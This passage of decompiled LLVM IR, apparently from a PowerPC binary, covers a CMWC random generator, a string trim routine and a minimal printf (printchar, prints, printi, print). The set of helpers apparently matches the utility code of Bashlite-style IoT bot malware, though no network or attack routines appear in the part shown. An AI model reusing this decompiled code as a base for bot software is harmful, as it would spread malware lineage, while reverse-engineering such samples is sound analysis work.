  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_1002c980.9 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_1002c4ec.12, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_1002c4ec.12, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_1002c980.9 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_1002c4e8.13, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_1002c4e8.13, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_1002c980.9 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_1002c980.9, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c980.9 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 6, 3, 5, 4, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp45 = icmp slt i32 %arg3, 1
  br i1 %tmp45, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c426 = load i8, i8* %arg2, align 1
  %v3_100006cc29 = icmp eq i8 %v2_100006c426, 0
  br i1 %v3_100006cc29, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c031 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.030 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.030, 1
  %v1_100006b8 = add i32 %v4_100006c031, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge3 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_10000700 ], [ %storemerge3, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075419 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075419, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.122 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.122, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.122, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079410 = load i8, i8* %arg2, align 1
  %v3_1000079c13 = icmp eq i8 %v2_1000079410, 0
  br i1 %v3_1000079c13, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079016 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.015 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.114 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.015, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.114, 1
  %v1_10000788 = add i32 %v4_1000079016, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d05 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d05, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.38 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.38, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.38, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp46 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp46, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

